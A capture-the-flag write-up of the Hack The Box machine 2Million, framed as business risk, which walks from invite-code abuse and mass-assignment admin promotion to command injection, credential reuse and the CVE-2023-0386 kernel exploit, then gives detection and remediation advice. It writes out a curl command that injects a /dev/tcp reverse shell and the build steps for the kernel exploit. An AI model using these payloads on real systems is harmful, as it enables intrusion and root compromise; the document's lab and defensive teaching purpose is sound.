00 Why this box matters (in business terms)

Nothing on this machine is exotic. No zero-day, no clever memory corruption, no nation-state tradecraft. What makes 2Million worth writing up is that every step maps to a line item a CISO already has on a spreadsheet somewhere — and the box quietly demonstrates the thing that's genuinely hard to explain in a boardroom: individually minor weaknesses compound.

Read as a business-risk story, the chain looks like this:

  • A gate that trusts the client (invite logic enforced in JavaScript) — security by obscurity, and obscurity is not a control.
  • An API that lets a normal user promote themselves to admin by flipping a field — broken access control, OWASP's #1 category, and the difference between a customer account and total application ownership.
  • User input handed straight to a shell (command injection) — the jump from "someone poked our web app" to "someone is running commands on our server."
  • One leaked secret in a config file that's also the SSH password — credential reuse, the mechanism that turns a single compromised service into lateral movement across the estate.
  • A kernel that was never patched (CVE-2023-0386) — patch-management debt, which guarantees any foothold eventually becomes root.

None of these is a "critical" on its own. A missing input filter is a two-line ticket. But chained, they take an anonymous visitor on the public internet to root on the host. That gap — between the severity of each bug and the severity of the outcome — is the translation from cyber risk to business risk. The offensive path below is the demo; the detection and remediation sections are the deliverable a client actually pays for.

01 Enumeration

Standard opening service scan:

 nmap
$ nmap -sC -sV -oA nmap/2million 10.10.11.221

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Two ports: SSH and HTTP. The web server redirects to a virtual host, so add it to your hosts file before anything else works:

 /etc/hosts
$ echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts

The site is a rebuild of the old Hack The Box front page, complete with the classic invite-code registration flow. Content discovery:

 gobuster
$ gobuster dir -u http://2million.htb -w /usr/share/wordlists/dirb/common.txt

/api          (Status: 401)
/css          (Status: 301)
/home         (Status: 302)
/invite       (Status: 200)
/js           (Status: 301)
/login        (Status: 200)
/logout       (Status: 302)
/register     (Status: 200)

/api returns 401 — an authenticated API surface — and /invite is the way in.

Mechanism first

The invite page gates registration, but the check runs in the browser. That's the tell. Any control you can read and re-run yourself isn't a control — it's a suggestion.

View source on /invite and you find an obfuscated script, /js/inviteapi.min.js. Beautify it and the obfuscation gives up a function, makeInviteCode(), that POSTs to an API path. Follow the trail:

 invite api
$ curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq

{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  }
}

The response names its own cipher (ROT13). Decoded, it says to make a POST request to /api/v1/invite/generate:

 generate code
$ curl -s -X POST http://2million.htb/api/v1/invite/generate | jq

{
  "0": 200,
  "success": 1,
  "data": {
    "code": "<base64-blob>",
    "format": "encoded"
  }
}

Base64-decode the code, feed it into /invite, register an account, and log in.

02 Foothold

2.1 — Enumerate the API surface

Now authenticated, hit the API root with your session cookie. It self-documents its routes:

 api enum
$ curl -s http://2million.htb/api/v1 -b "PHPSESSID=<your-session>" | jq

# among the returned routes:
GET  /api/v1/admin/auth
PUT  /api/v1/admin/settings/update
POST /api/v1/admin/vpn/generate

First, confirm you're not admin:

 admin check
$ curl -s http://2million.htb/api/v1/admin/auth -b "PHPSESSID=<your-session>" | jq
{ "message": false }

2.2 — Broken access control: self-promotion to admin

Mechanism first

/api/v1/admin/settings/update updates your account and trusts the fields you send it — including one you were never meant to touch. This is mass assignment: the endpoint binds request parameters straight onto the user object with no allow-list, so is_admin is writable by the very account it's meant to protect against.

Two gotchas that eat time here: the endpoint demands Content-Type: application/json, and is_admin must be an integer, not a string.

 mass assignment
$ curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
    -b "PHPSESSID=<your-session>" \
    -H "Content-Type: application/json" \
    -d '{"email":"me@2million.htb","is_admin":1}' | jq

{ "id": 14, "username": "...", "is_admin": 1 }

Re-check /api/v1/admin/auth and it now returns true. You are admin — without ever touching the admin's password.

2.3 — Command injection: reverse shell

The admin VPN generator builds an OpenVPN config by shelling out to a certificate command, and it drops your username into that command unsanitized.

Mechanism first

The server runs something like bash -c "... generate-cert <username> ...". Because username isn't quoted or filtered, a shell metacharacter (;, |, &&) breaks out of the intended command and runs whatever you append. This is the moment the incident stops being "web" and becomes "host."

LHOST discipline — the one that silently kills HTB shells: use your tun0 address, not the VMware NAT interface. Confirm with ip addr show tun0 first, then start a listener:

 listener (tun0)
$ nc -lvnp 4444

Inject a reverse shell through the username field:

 command injection
$ curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
    -b "PHPSESSID=<your-session>" \
    -H "Content-Type: application/json" \
    -d '{"username":"a; bash -c '\''bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'\''"}'

Catch the shell as www-data, stabilize it (python3 -c 'import pty;pty.spawn("/bin/bash")'), and move on.

03 Privilege Escalation

3.1 — Credentials in a config file → SSH as admin

The app keeps its secrets in a .env at the web root:

 www-data
www-data@2million:~$ cat /var/www/html/.env

DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=<redacted-password>
Mechanism first

These are database credentials — but the system also has a Linux user named admin, and the password was reused. This is the highest-leverage, lowest-sophistication move in security: one secret unlocks a second, unrelated thing. The blast radius of a leaked credential is defined entirely by how many places it's reused.

 ssh · user.txt
$ ssh admin@2million.htb
# password: <redacted-password>

admin@2million:~$ cat user.txt
[REDACTED — grab your own]

3.2 — The hint, then the kernel

Check the mail spool. The box leaves a narrative breadcrumb — an internal note about an urgent OS update, a colleague flagging an unpatched OverlayFS kernel vulnerability. In a real environment, that email is the "known issue we never got to" that every breach retro contains.

 kernel check
admin@2million:~$ cat /var/mail/admin
# ... reference to a pending OverlayFS kernel fix ...

admin@2million:~$ uname -r
5.15.70-...    # vulnerable to CVE-2023-0386

3.3 — CVE-2023-0386: OverlayFS setuid copy-up

Mechanism first (worth actually understanding)

OverlayFS stacks a writable upper directory over a read-only lower one and shows a merged view. When a file is modified, the kernel "copies it up" from lower to upper. The bug: an unprivileged user can place a setuid-root binary in the lower layer (via a user-namespace + FUSE filesystem they control) and trigger a copy-up such that the kernel preserves the setuid bit and root ownership into the upper layer — which the user can then execute. Unprivileged → root, with no memory corruption: it's a logic flaw in how capabilities survive the copy-up.

The exploit is multi-file with a Makefile, so clone the whole repo — don't reconstruct it from a snippet. Miss one source file or the FUSE helper and it won't build:

 root.txt
$ git clone https://github.com/<author>/CVE-2023-0386
$ cd CVE-2023-0386 && make all
# follow the repo's run steps (typically two terminals:
#   one mounts the FUSE/overlay layer, the other triggers exec)

# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
[REDACTED — grab your own]

Rooted.

05 Detection Opportunities (Blue Team)

This is where the box earns the "purple" label. Every offensive step is loud if you're watching the right signal.

Invite-API abuse (steps 2–3)

Unauthenticated POSTs to /api/v1/invite/generate and the undocumented .../how/to/generate path, from a non-browser user agent (curl, python-requests), with no referring page load. Detect: WAF/access-log rules on API paths, rate-limiting on invite generation, alerting on endpoints that never appear in normal front-end traffic.

Self-promotion to admin (step 5)

A PUT to the settings endpoint in which is_admin changes value, executed by a session that is not currently admin. Detect: application-level audit logging on any privilege/role mutation — this should be a high-signal alert, because a legitimate user should never flip their own admin bit. Correlate with the account being minutes old.

Command injection + reverse shell (step 6)

The web process (nginx/PHP-FPM) spawning /bin/bash -i, and an outbound TCP connection from that process to an external host on an odd port. Web servers answer connections; they don't originate them. Detect: EDR/Sysmon parent-child rule (web daemon → shell), auditd execve logging, egress filtering, and WAF rules on shell metacharacters in parameters.

Credential reuse / SSH pivot (steps 7–8)

A successful SSH login as admin from an external source shortly after web-tier compromise, and www-data reading .env. Detect: file-access monitoring (FIM/auditd watch) on secrets files, SSH auth-log alerting on new-source logins, and — the high-value one — time correlation between a web RCE event and a subsequent SSH login from the same IP.

Kernel exploitation (step 9)

Compiler activity in a home dir or /tmp (gcc, make), an unprivileged mount/OverlayFS + FUSE syscall sequence, and a setuid-root process suddenly spawning from an interactive admin shell. Detect: auditd rules on mount/clone syscalls and on execve of newly created setuid binaries; EDR alerting on toolchain execution outside build environments.

The theme: an attacker who's careful about the web portion still trips over process lineage, outbound connections, and privilege-change events on the host. Those three are where a SOC with decent host telemetry wins.

06 Remediation

Prioritized and tied to root cause — the way it reads in the recommendations section of a real report:

  1. Enforce invite validation server-side and rate-limit it. Client-side gating is not access control. (Root cause: security by obscurity.)
  2. Add a strict allow-list to the settings endpoint. Bind only user-editable fields; is_admin and any authorization attribute must be server-controlled and unreachable from user input. (Root cause: mass assignment — the highest-severity finding here.)
  3. Never pass user input to a shell. Parameterize the cert-generation call, validate username against a strict character set, drop the web user's shell privileges. (Root cause: OS command injection → RCE.)
  4. Kill credential reuse and segregate secrets. App/DB credentials must never equal system-login credentials; rotate the exposed secret, restrict .env permissions, scope the DB account to least privilege. (Root cause: credentials in files + reuse → lateral movement.)
  5. Patch the kernel and set patch SLAs. CVE-2023-0386 is fixed upstream; the mail hint shows the org knew and hadn't acted. (Root cause: patch-management debt → privilege escalation.)

Five findings, none individually "critical," combine into full host compromise from an anonymous starting point. Severity doesn't live in the individual bug — it lives in the chain, and the chain is invisible unless someone walks it end to end.
